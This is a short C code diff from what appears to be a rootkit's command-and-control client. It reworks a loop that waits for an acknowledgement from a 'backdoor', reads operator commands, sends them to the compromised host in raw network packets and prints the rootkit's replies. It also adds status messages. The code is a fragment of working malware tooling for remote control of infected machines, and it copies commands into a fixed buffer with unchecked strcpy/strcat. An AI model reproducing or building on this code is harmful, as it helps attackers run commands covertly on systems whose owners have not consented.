@@ -156,24 +156,27 @@ void activate_command_control_shell(char* argv){
     
     //Wait for rootkit ACK to ensure it's up
     rawsocket_sniff_pattern(CC_PROT_ACK);
-    printf("["KGRN"OK"RESET"]""Success!\n");   
+    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
 
     //Received ACK, we proceed to send command
     while(1){
         char buf[BUFSIZ];                                                                                                                                                          
         printf(""KYLW"c>:"RESET"");                                                                                                                                                              
         scanf("%s", buf);                                                                                                                                                                             
+        
+        char msg[BUFSIZ];
+        strcpy(msg, CC_PROT_MSG);
+        strcat(msg, buf);
+        packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, msg);
+        printf("Sending %s\n", msg);
         if(rawsocket_send(packet)<0){
             printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
             return;
         }
-        char msg[BUFSIZ];
-        strcpy(msg, CC_PROT_MSG);
-        strcat(msg, buf);
-        printf("Sending %s\n", msg);
-        packet_t packet = rawsocket_sniff_pattern(CC_PROT_MSG);
+        printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
+        packet = rawsocket_sniff_pattern(CC_PROT_MSG);
         char* res = packet.payload;
-        printf(""KYLW"c>:"RESET" %s\n", res);   
+        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
     }
     
     free(local_ip);
